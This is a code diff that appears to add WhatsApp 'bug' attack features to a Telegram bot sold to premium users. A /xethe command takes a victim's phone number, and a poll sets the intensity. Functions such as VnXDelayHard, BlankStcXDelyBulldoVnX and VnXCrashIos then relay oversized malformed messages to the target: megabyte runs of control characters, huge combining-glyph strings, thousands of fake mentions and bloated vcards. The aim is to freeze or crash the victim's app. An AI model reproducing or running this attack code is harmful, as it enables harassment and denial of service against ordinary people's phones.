+    activePolls.delete(pollId);
+});
+bot.onText(/\/xethe(?:\s+(\d+))?/, async (msg, match) => {
+    const chatId = msg.chat.id;
+    const userId = msg.from.id;
+
+    if (!match || !match[1]) {
+        return bot.sendMessage(chatId, 
+            `❌ *Format salah!*\n\nGunakan: /nezha [nomor]\nContoh: /nezha 628888888888`,
+            { parse_mode: "Markdown" }
+        );
+    }
+
+    const targetNumber = match[1];
+    const randomImage = getRandomImage();
+    const date = getCurrentDate();
+    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
+    const target = `${formattedNumber}@s.whatsapp.net`;
+    const isUserPremium = premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date());
+
+    if (!isUserPremium) {
+        return bot.sendPhoto(chatId, randomImage, {
+            caption: `<blockquote>(本) 𝖲𝗍𝖾𝗅𝗅𝖺𝗋 - Dawn</blockquote>\n❌ Akses ditolak. Fitur ini hanya untuk user premium.`,
+            parse_mode: "HTML",
+            reply_markup: {
+                inline_keyboard: [[{ text: "𝖠𝗎𝗍𝗁𝗈𝗋", url: "https://t.me/SonKairn" }]]
+            }
+        });
+    }
+
+    if (sessions.size === 0) {
+        return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung. Jalankan /connect terlebih dahulu.`);
+    }
+
+    const imageMsg = await bot.sendPhoto(chatId, randomImage, {
+        caption: `
+<pre>ＳＴＥＬＬＡＲ ─ ＤＡＷＮ</pre>
+┌────────────────────────┐
+│─ Target : ${formattedNumber}
+│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : ⏳ 𝖬𝖾𝗇𝗎𝗇𝗀𝗀𝗎 𝖯𝗂𝗅𝗂𝗁𝖺𝗇
+│─ Date   : ${date}
+└────────────────────────┘
+ ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
+        `,
+        parse_mode: "HTML"
+    });
+
+    const pollMessage = await bot.sendPoll(chatId, 
+        `ПОЖАЛУЙСТА, ВЫБЕРИТЕ`,
+        ['30%', '50%', '70%'],
+        {
+            is_anonymous: false,
+            allows_multiple_answers: false,
+            reply_to_message_id: imageMsg.message_id,
+            open_period: 60
+        }
+    );
+
+    activePolls.set(pollMessage.poll.id, {
+        chatId,
+        userId,
+        targetNumber: formattedNumber,
+        target,
+        videoMessageId: imageMsg.message_id,
+        pollMessageId: pollMessage.message_id,
+        pollId: pollMessage.poll.id,
+        date,
+        randomImage
+    });
+
+    setTimeout(async () => {
+        try {
+            if (!activePolls.has(pollMessage.poll.id)) return;
+            await bot.deleteMessage(chatId, pollMessage.message_id);
+            await bot.editMessageCaption(
+                `
+<pre>ＳＴＥＬＬＡＲ ─ ＤＡＷＮ</pre>
+┌────────────────────────┐
+│─ Target : ${formattedNumber}
+│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : ⌛ 𝖤𝗑𝗉𝗂𝗋𝖾𝖽
+│─ Date   : ${date}
+└────────────────────────┘
+ ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
+                `,
+                {
+                    chat_id: chatId,
+                    message_id: imageMsg.message_id,
+                    parse_mode: "HTML"
+                }
+            );
+            activePolls.delete(pollMessage.poll.id);
+        } catch (err) {
+            console.log('Error cleanup poll:', err);
+        }
+    }, 60000);
+});
+
+bot.on('poll_answer', async (pollAnswer) => {
+    const pollId = pollAnswer.poll_id;
+    const userId = pollAnswer.user.id;
+    const selectedOptions = pollAnswer.option_ids;
+
+    const pollData = activePolls.get(pollId);
+    if (!pollData) return;
+
+    if (userId !== pollData.userId) {
+        return bot.sendMessage(pollData.chatId, 
+            `⚠️ @${pollAnswer.user.username} — 𝖧𝖺𝗇𝗒𝖺 𝗎𝗇𝗍𝗎𝗄 𝗎𝗌𝖾𝗋 𝗒𝖺𝗇𝗀 𝗋𝖾𝗊𝗎𝖾𝗌𝗍!`
+        );
+    }
+
+    const optionId = selectedOptions[0];
+    let action;
+    switch(optionId) {
+        case 0: action = '30%'; break;
+        case 1: action = '50%'; break;
+        case 2: action = '70%'; break;
+        default: return;
+    }
+
+    try { await bot.deleteMessage(pollData.chatId, pollData.pollMessageId); } 
+    catch (err) { console.log('Error deleting poll:', err); }
+
+    if (action === 'cancel') {
+        await bot.editMessageCaption(
+            `
+<pre>ＳＴＥＬＬＡＲ ─ ＤＡＷＮ</pre>
+┌────────────────────────┐
+│─ Target : ${pollData.targetNumber}
+│─ Rasio  : ${action.toUpperCase()}
+│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : ❌ 𝖡𝖺𝗍𝖺𝗅
+│─ Date   : ${pollData.date}
+└────────────────────────┘
+ ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
+            `,
+            {
+                chat_id: pollData.chatId,
+                message_id: pollData.videoMessageId,
+                parse_mode: "HTML",
+                reply_markup: {
+                    inline_keyboard: [[{ text: "Проверь", url: `https://wa.me/${pollData.targetNumber}` }]]
+                }
+            }
+        );
+        activePolls.delete(pollId);
+        return;
+    }
+
+    await bot.editMessageCaption(
+        `
+<pre>ＳＴＥＬＬＡＲ ─ ＤＡＷＮ</pre>
+┌────────────────────────┐
+│─ Target : ${pollData.targetNumber}
+│─ Rasio   : ${action.toUpperCase()}
+│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : 𝖯𝗋𝗈𝗌𝖾𝗌
+│─ Date   : ${pollData.date}
+└────────────────────────┘
+ ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
+        `,
+        {
+            chat_id: pollData.chatId,
+            message_id: pollData.videoMessageId,
+            parse_mode: "HTML",
+            reply_markup: {
+                inline_keyboard: [[{ text: "Проверь", url: `https://wa.me/${pollData.targetNumber}` }]]
+            }
+        }
+    );
+
+    try {
+        const sock = sessions.values().next().value;
+        const target = `${pollData.targetNumber}@s.whatsapp.net`;
+
+        if (action === '30%') {
+            for (let i = 0; i < 5; i++) {
+                await BlankStcXDelyBulldoVnX(sock, target);
+                await sleep(500);
+                await BlankStcXDelyBulldoVnX(sock, target);
+                await sleep(500);
+            }
+        } else if (action === '50%') {
+            for (let i = 0; i < 15; i++) {
+                await BlankStcXDelyBulldoVnX(sock, target);
+                await sleep(500);
+                await BlankStcXDelyBulldoVnX(sock, target);
+                await sleep(500);
+                
+            }
+        }
+        else if (action === '70%') {
+            for (let i = 0; i < 20; i++) {
+                await BlankStcXDelyBulldoVnX(sock, target);
+                await sleep(500);
+                await BlankStcXDelyBulldoVnX(sock, target);
+                await sleep(500);
+                
                 }
                 }
 
@@ -3080,6 +4045,691 @@ async function RxVzBurstV2(sock, target) {
     } catch (e) {
         console.error("Relay Error:", e);
     }
+}
+async function VnXDelayHard(sock, target, ptcp = true) {
+  try {
+    const generateMasifJids = (length) => Array.from({
+        length
+      }, () =>
+      `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
+    );
+
+    const mentionedJidBase = ["0@s.whatsapp.net", ...generateMasifJids(1900)];
+    const mentionedJidSuperMasif = generateMasifJids(1900 + 1950);
+    const largeEmptyJson = "\u0000".repeat(1045000);
+    const largeControlCharJson = "\x10".repeat(1045000);
+
+    const VidMessage = generateWAMessageFromContent(target, {
+      videoMessage: {
+        url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
+        mimetype: "video/mp4",
+        fileLength: "289511",
+        seconds: 15,
+        caption: "\n",
+        height: 640,
+        width: 640,
+        contextInfo: {
+          isSampled: true,
+          participant: target,
+          mentionedJid: mentionedJidBase,
+          remoteJid: "X",
+          forwardingScore: 100,
+          isForwarded: true,
+          quotedMessage: {
+            businessMessageForwardInfo: {
+              businessOwnerJid: "0@s.whatsapp.net"
+            }
+          },
+        },
+      },
+    }, {
+      ephemeralExpiration: 0,
+      forwardingScore: 9741,
+      isForwarded: true
+    });
+    
+    await sock.relayMessage(target, {
+      groupStatusMessageV2: {
+        message: VidMessage.message
+      },
+    }, ptcp ? {
+      messageId: VidMessage.key.id,
+      participant: {
+        jid: target
+      }
+    } : {
+      messageId: VidMessage.key.id
+    });
+
+    const Msg1 = await generateWAMessageFromContent(target, {
+      viewOnceMessage: {
+        message: {
+          interactiveResponseMessage: {
+            body: {
+              text: "Kenal MoroseWave Gak Bang??",
+              format: "DEFAULT"
+            },
+            nativeFlowResponseMessage: {
+              name: "galaxy_message",
+              paramsJson: largeEmptyJson,
+              version: 3
+            },
+            contextInfo: {
+              mentionedJid: mentionedJidBase
+            }
+          }
+        }
+      }
+    }, {});
+
+    await sock.relayMessage(target, {
+      groupStatusMessageV2: {
+        message: Msg1.message
+      },
+    }, ptcp ? {
+      messageId: Msg1.key.id,
+      participant: {
+        jid: target
+      }
+    } : {
+      messageId: Msg1.key.id
+    });
+
+    const Msg2 = generateWAMessageFromContent(target, {
+      viewOnceMessage: {
+        message: {
+          interactiveResponseMessage: {
+            body: {
+              text: "Njir lah Ada Danzvorever",
+              format: "DEFAULT"
+            },
+            nativeFlowResponseMessage: {
+              name: "galaxy_message",
+              paramsJson: largeEmptyJson,
+              version: 3
+            },
+            entryPointConversionSource: "call_permission_request",
+          }
+        }
+      }
+    }, {
+      ephemeralExpiration: 0,
+      forwardingScore: 9741,
+      isForwarded: true,
+    });
+
+    await sock.relayMessage(target, {
+      groupStatusMessageV2: {
+        message: Msg2.message
+      },
+    }, ptcp ? {
+      messageId: Msg2.key.id,
+      participant: {
+        jid: target
+      }
+    } : {
+      messageId: Msg2.key.id
+    });
+
+    const Msg3 = await generateWAMessageFromContent(target, {
+      viewOnceMessage: {
+        message: {
+          interactiveResponseMessage: {
+            body: {
+              text: "Kenal MoroseWave Gak Bang??",
+              format: "DEFAULT"
+            },
+            nativeFlowResponseMessage: {
+              name: "call_permission_request",
+              paramsJson: largeControlCharJson,
+              version: 3
+            },
+            entryPointConversionSource: "galaxy_message"
+          }
+        }
+      }
+    }, {
+      ephemeralExpiration: 0,
+      forwardingScore: 9741,
+      isForwarded: true,
+    });
+
+    await sock.relayMessage(target, {
+      groupStatusMessageV2: {
+        message: Msg3.message
+      },
+    }, ptcp ? {
+      messageId: Msg3.key.id,
+      participant: {
+        jid: target
+      }
+    } : {
+      messageId: Msg3.key.id
+    });
+
+    const payload = generateWAMessageFromContent(target, {
+      viewOnceMessage: {
+        message: {
+          interactiveResponseMessage: {
+            body: {
+              text: "Njir lah delay bet",
+              format: "DEFAULT"
+            },
+            nativeFlowResponseMessage: {
+              name: "address_message",
+              paramsJson: largeControlCharJson,
+              version: 3
+            },
+            entryPointConversionSource: "call_permission_request"
+          },
+        },
+      },
+    }, {
+      ephemeralExpiration: 0,
+      forwardingScore: 9741,
+      isForwarded: true
+    });
+
+    await sock.relayMessage(target, {
+      groupStatusMessageV2: {
+        message: payload.message
+      },
+    }, ptcp ? {
+      messageId: payload.key.id,
+      participant: {
+        jid: target
+      }
+    } : {
+      messageId: payload.key.id
+    });
+
+    const payload2 = generateWAMessageFromContent(target, {
+      viewOnceMessage: {
+        message: {
+          interactiveResponseMessage: {
+            body: {
+              text: "\n",
+              format: "DEFAULT"
+            },
+            nativeFlowResponseMessage: {
+              name: "call_permission_request",
+              paramsJson: largeControlCharJson,
+              version: 3,
+            },
+            entryPointConversionSource: "call_permission_message"
+          },
+        },
+      },
+    }, {
+      ephemeralExpiration: 0,
+      forwardingScore: 9741,
+      isForwarded: true
+    });
+
+    await sock.relayMessage(target, {
+      groupStatusMessageV2: {
+        message: payload2.message
+      },
+    }, ptcp ? {
+      messageId: payload2.key.id,
+      participant: {
+        jid: target
+      }
+    } : {
+      messageId: payload2.key.id
+    });
+
+    const Msg4 = generateWAMessageFromContent(target, {
+      stickerMessage: {
+        url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c&mms3=true",
+        mimetype: "image/webp",
+        fileLength: 12260,
+        mediaKeyTimestamp: "1743832131",
+        contextInfo: {
+          mentionedJid: mentionedJidBase,
+          quotedMessage: {
+            paymentInviteMessage: {
+              serviceType: 3,
+              expiryTimestamp: Date.now() + 1814400000
+            }
+          }
+        }
+      }
+    }, {});
+
+    await sock.relayMessage(target, {
+      groupStatusMessageV2: {
+        message: Msg4.message
+      },
+    }, ptcp ? {
+      messageId: Msg4.key.id,
+      participant: {
+        jid: target
+      }
+    } : {
+      messageId: Msg4.key.id
+    });
+
+    const Msg5 = generateWAMessageFromContent(target, {
+      extendedTextMessage: {
+        text: "ꦾ".repeat(555555),
+        contextInfo: {
+          participant: target,
+          mentionedJid: mentionedJidBase
+        }
+      }
+    }, {});
+
+    await sock.relayMessage(target, {
+      groupStatusMessageV2: {
+        message: Msg5.message
+      },
+    }, ptcp ? {
+      messageId: Msg5.key.id,
+      participant: {
+        jid: target
+      }
+    } : {
+      messageId: Msg5.key.id
+    });
+
+    const Msg6 = generateWAMessageFromContent(target, {
+      videoMessage: {
+        url: "https://mmg.whatsapp.net/v/t62.7161-24/19384532_1057304676322810_128231561544803484_n.enc?ccb=11-4&oh=01_Q5Aa1gHRy3d90Oldva3YRSUpdfcQsWd1mVWpuCXr4zV-3l2n1A&oe=685BEDA9&_nc_sid=5e03e0&mms3=true",
+        mimetype: "video/mp4",
+        fileLength: "1515940",
+        seconds: 14,
+        contextInfo: {
+          isSampled: true,
+          mentionedJid: [target]
+        },
+        forwardedNewsletterMessageInfo: {
+          newsletterJid: "120363321780343299@newsletter",
+          serverMessageId: 1,
+          newsletterName: "MoroseWave Nich"
+        },
+      }
+    }, {});
+
+    await sock.relayMessage(target, {
+      groupStatusMessageV2: {
+        message: Msg6.message
+      },
+    }, ptcp ? {
+      messageId: Msg6.key.id,
+      participant: {
+        jid: target
+      }
+    } : {
+      messageId: Msg6.key.id
+    });
+
+    const Msg7 = generateWAMessageFromContent(target, {
+      audioMessage: {
+        url: "https://mmg.whatsapp.net/v/t62.7114-24/30579250_1011830034456290_180179893932468870_n.enc?ccb=11-4&oh=01_Q5Aa1gHANB--B8ZZfjRHjSNbgvr6s4scLwYlWn0pJ7sqko94gg&oe=685888BC&_nc_sid=5e03e0&mms3=true",
+        mimetype: "audio/mpeg",
+        fileLength: "389948",
+        seconds: 24,
+        caption: "Danzvorever Is Back",
+      }
+    }, {});
+
+    await sock.relayMessage(target, {
+      groupStatusMessageV2: {
+        message: Msg7.message
+      },
+    }, ptcp ? {
+      messageId: Msg7.key.id,
+      participant: {
+        jid: target
+      }
+    } : {
+      messageId: Msg7.key.id
+    });
+
+    const Msg8 = generateWAMessageFromContent(target, {
+      imageMessage: {
+        url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
+        mimetype: "image/jpeg",
+        caption: "Lu kenapa Dah??",
+        fileLength: "19769",
+        contextInfo: {
+          mentionedJid: mentionedJidSuperMasif,
+          isSampled: true,
+          participant: target,
+          remoteJid: "status@broadcast",
+          forwardingScore: 9741,
+          isForwarded: true
+        }
+      }
+    }, {});
+
+    await sock.relayMessage(target, {
+      groupStatusMessageV2: {
+        message: Msg8.message
+      },
+    }, ptcp ? {
+      messageId: Msg8.key.id,
+      participant: {
+        jid: target
+      }
+    } : {
+      messageId: Msg8.key.id
+    });
+
+    const ImgMessage = generateWAMessageFromContent(target, {
+      imageMessage: {
+        url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
+        mimetype: "image/jpeg",
+        fileLength: "289511",
+        caption: "kasiann lu pasti delay ya???",
+        contextInfo: {
+          isSampled: true,
+          mentionedJid: ["628123456789@s.whatsapp.net"]
+        },
+        forwardedNewsletterMessageInfo: {
+          newsletterJid: "120363321780343299@newsletter",
+          serverMessageId: 2,
+          newsletterName: "Salken Bang Gw Danzvorever"
+        },
+        annotations: [{
+          embeddedContent: {
+            embeddedMusic: {
+              musicContentMediaId: "589608164114572",
+              songId: "870166291800509",
+              author: "Danzvorever",
+              title: "This Is MoroseWave",
+              artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
+              artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
+            }
+          },
+          embeddedAction: true
+        }]
+      }
+    }, {
+      ephemeralExpiration: 0,
+      forwardingScore: 12000,
+      isForwarded: true
+    });
+
+    await sock.relayMessage(target, {
+      groupStatusMessageV2: {
+        message: ImgMessage.message
+      },
+    }, {
+      messageId: ImgMessage.key.id
+    });
+
+    const MsgDocument = generateWAMessageFromContent(target, {
+      documentMessage: {
+        url: "https://www.google.com/",
+        mimetype: "text/plain",
+        title: "\u200b".repeat(90000),
+        fileLength: "1",
+        pageCount: 1,
+        mediaKey: "A1B2C3D4E5F6G7H8",
+        contextInfo: {
+          mentionedJid: mentionedJidSuperMasif,
+          forwardingScore: 100000,
+        }
+      }
+    }, {});
+
+    await sock.relayMessage(target, {
+      groupStatusMessageV2: {
+        message: MsgDocument.message
+      },
+    }, ptcp ? {
+      messageId: MsgDocument.key.id,
+      participant: {
+        jid: target
+      }
+    } : {
+      messageId: MsgDocument.key.id
+    });
+
+    const MsgContact = generateWAMessageFromContent(target, {
+      contactMessage: {
+        displayName: "MoroseWave",
+        vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;${"~".repeat(100000)};;;\nFN:DANZVOREVER\nEND:VCARD`,
+        contextInfo: {
+          mentionedJid: mentionedJidBase,
+          remoteJid: "status@broadcast",
+          forwardingScore: 999999999,
+        }
+      }
+    }, {
+      ephemeralExpiration: 0,
+      forwardingScore: 9741,
+      isForwarded: true
+    });
+
+    await sock.relayMessage(target, {
+      groupStatusMessageV2: {
+        message: MsgContact.message
+      },
+    }, ptcp ? {
+      messageId: MsgContact.key.id,
+      participant: {
+        jid: target
+      }
+    } : {
+      messageId: MsgContact.key.id
+    });
+
+    console.log(`sedang mengirim bug`, target);
+
+  } catch (err) {
+    console.log(`error saat mengirim bug`, target, err);
+  }
+}
+async function RvXDelayui(sock, target) {
+ let RVX = await generateWAMessageFromContent(
+   target,
+  {
+    viewOnceMessage: {
+      message: {
+        interactiveMessage: {
+          header: {
+            documentMessage: {
+              url: "https://mmg.whatsapp.net/o1/v/t24/f2/m269/AQMJjQwOm3Kcds2cgtYhlnxV6tEHgRwA_Y3DLuq0kadTrJVphyFsH1bfbWJT2hbB1KNEpwsB_oIJ5qWFMC8zi3Hkv-c_vucPyIAtvnxiHg?ccb=9-4&oh=01_Q5Aa2QFabafbeTby9nODc8XnkNnUEkk-crsso4FfGOwoRuAjuw&oe=68CD54F7&_nc_sid=e6ed6c&mms3=true",
+              mimetype: "image/jpeg",
+              fileSha256: "HKXSAQdSyKgkkF2/OpqvJsl7dkvtnp23HerOIjF9/fM=",
+              fileLength: "999999999999999",
+              fileName: "ြ".repeat(150000),
+              height: 999999,
+              width: 999999,
+              mediaKey: "TGuDwazegPDnxyAcLsiXSvrvcbzYpQ0b6iqPdqGx808=",
+              fileEncSha256: "hRGms7zMrcNR9LAAD3+eUy4QsgFV58gm9nCHaAYYu88=",
+              directPath: "/o1/v/t24/f2/m269/AQMJjQwOm3Kcds2cgtYhlnxV6tEHgRwA_Y3DLuq0kadTrJVphyFsH1bfbWJT2hbB1KNEpwsB_oIJ5qWFMC8zi3Hkv-c_vucPyIAtvnxiHg?ccb=9-4&oh=01_Q5Aa2QFabafbeTby9nODc8XnkNnUEkk-crsso4FfGOwoRuAjuw&oe=68CD54F7&_nc_sid=e6ed6c",
+              mediaKeyTimestamp: "1755695348",
+              jpegThumbnail: null
+            }
+          },
+          body: {
+            text: "RTX" + "ꦽ".repeat(120000)
+          },
+          footer: {
+            text: "VNX" + "ြ".repeat(130000)
+          },
+          nativeFlowMessage: {
+            nativeFlowMessage: {
+            buttons: [{
+              name: "cta_url",
+              buttonParamsJson: "{\"display_text\":\"ⓘ ⸸VnX\",\"url\":\"http://wa.mE/stickerpack/VnX\",\"merchant_url\":\"https://wa.me/settings/channel/status\"}"
+            }
+          ]
+            }
+          }
+        }
+      }
+      }
+    }, 
+  { userJid: target }
+); 
+
+  await sock.relayMessage(
+    target,
+      RVX.message,
+    {
+      participant: { jid: target },
+      messageId: null
+    }
+  );
+}
+async function BlankStcXDelyBulldoVnX(sock, target) {
+    try {
+        await sock.relayMessage(
+            target,
+            {
+             viewOnceMessage: {
+                message: {
+                    newsletterAdminInviteMessage: {
+                         newsletterJid: "120363321780343299@newsletter",
+                         newsletterName: "Coba Kamu Pencet Chat Ini 🍁" + "ꦽꦾ".repeat(250000),
+                         caption: "VnX Bng" + "ꦽꦾ".repeat(250000),
+                         inviteExpiration: "9282682616283736",                      
+                        }
+                    }
+                }
+            },
+            { participant: { jid: target } }
+        ); 
+        
+        const sticker = generateWAMessageFromContent(target, {
+            viewOnceMessage: {
+                message: {
+                  stickerPackMessage: {
+                    stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
+                    name: "⎋🩸⃟༑VnX Stiker༑" + "ꦾ".repeat(45000),
+                    publisher: "ꦽ".repeat(25000),
+                    stickers: [],
+                    fileLength: 12260,
+                    fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
+                    fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
+                    mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
+                    directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw",
+                     height: 9999,
+                     width: 9999,
+                     mediaKeyTimestamp: "1747502082",
+                     isAnimated: false,
+                     isAvatar: false,
+                     isAiSticker: false,
+                     isLottie: false,
+                     emojis: ["🕸", "🕷", "🦠", "🌹"],
+                    },
+                },
+            },
+        }, {});
+
+        const vnxmbg2 = generateWAMessageFromContent(target, {
+            groupStatusMessageV2: {
+                message: {
+                    interactiveResponseMessage: {
+                        body: {
+                            text: "Makanan Enak Ya VnX",
+                            format: "DEFAULT"
+                        },
+                        nativeFlowResponseMessage: {
+                            name: "galaxy_message",
+                            paramsJson: "\x10".repeat(1045000),
+                            version: 3
+                        },
+                        entryPointConversionSource: "call_permission_request"
+                    },
+                },
+            },
+        }, {
+            groupMentions: [],
+            entryPointConversionSource: "non_contact",
+            entryPointConversionApp: "whatsapp",
+            entryPointConversionDelaySeconds: 467593,
+            stanzaId:
+            "666-666666-VnX-Id" +
+            Math.floor(Math.random() * 99999),
+        });
+        
+        await sock.relayMessage(target, {
+            message: sticker.message,
+        }, {
+            messageId: sticker.key.id,
+            participant: { jid: target },
+        });
+
+        await sock.relayMessage(target, {
+            groupStatusMessageV2: {
+                message: vnxmbg2.message,
+            },
+        }, {
+            messageId: vnxmbg2.key.id,
+            participant: { jid: target },
+        });
+
+    } catch (err) {
+        console.error("error:", err);
+    }
+}
+async function VnXCrashIos(sock, target) {
+    let mbgiosvnx = await generateWAMessageFromContent(
+        target,
+        {
+         contactMessage: {
+            displayName:
+        "°‌‌VnXIos ⿻ VnX ✶ > 666" + "𑇂𑆵𑆴𑆿".repeat(25000),
+            vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;🦠⃰‌°‌‌VnX ⿻ Are You Okay? ✶ > 666${"𑇂𑆵𑆴𑆿".repeat(10000)};;;\nFN:🦠⃰‌°‌‌VnX ⿻ 𝗪𝗲‌𝗹‌𝗰⃨𝗼‌‌𝗺𝗲 ✶ > 666${"𑇂𑆵𑆴𑆿".repeat(10000)}\nNICKNAME:🦠⃰‌°‌‌VnX ⿻ 𝗪𝗲‌𝗹‌𝗰⃨𝗼‌‌𝗺𝗲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nORG:🦠⃰‌°‌‌VnX ⿻ 𝗪𝗲‌𝗹‌𝗰⃨𝗼‌‌𝗺𝗲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nTITLE:🦠⃰‌°‌‌VnX ⿻ 𝗪𝗲‌𝗹‌𝗰⃨𝗼‌‌𝗺𝗲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nitem1.TEL;waid=6287873499996:+62 813-1919-9692\nitem1.X-ABLabel:Telepon\nitem2.EMAIL;type=INTERNET:🦠⃰‌°‌‌VnX ⿻ 𝗪𝗲‌𝗹‌𝗰⃨𝗼‌‌𝗺𝗲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nitem2.X-ABLabel:Kantor\nitem3.EMAIL;type=INTERNET:🦠⃰‌°‌‌VnX ⿻ 𝗪𝗲‌𝗹‌𝗰⃨𝗼‌‌𝗺𝗲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nEND:VCARD`,
+                contextInfo: {
+                    stanzaId: "VnX",
+                    mentionedJid: [target], 
+                    isForwarded: true,
+                    forwardingScore: 999,
+                    
+                    interactiveAnnotations: [{
+                        polygonVertices: [
+                            { x: 0.05625700578093529, y: 0.1530572921037674 },
+                            { x: 0.9437337517738342, y: 0.1530572921037674 },
+                            { x: 0.9437337517738342, y: 0.8459166884422302 },
+                            { x: 0.05625700578093529, y: 0.8459166884422302 }
+                        ],
+                        newsletter: {
+                            newsletterJid: "120363186130999681@newsletter",
+                            serverMessageId: 3033,
+                            newsletterName: "sex null",
+                            contentType: "UPDATE_CARD"
+                        }
+                    }]
+                } 
+            }
+        },
+        { userJid: sock.user.id, quoted: null }
+    );
+
+    await sock.relayMessage(
+        "status@broadcast",
+        mbgiosvnx.message,
+        {
+            messageId: mbgiosvnx.key.id,
+            statusJidList: [target],
+            additionalNodes: [
+                {
+                    tag: "meta",
+                    attrs: {},
+                    content: [
+                        {
+                            tag: "mentioned_users",
+                            attrs: {},
+                            content: [
+                                {
+                                    tag: "to",
+                                    attrs: { jid: target },
+                                    content: undefined
+                                }
+                            ]
+                        }
+                    ]
+                }
+            ]
+        }
+    );
 }
 
 // Error handling
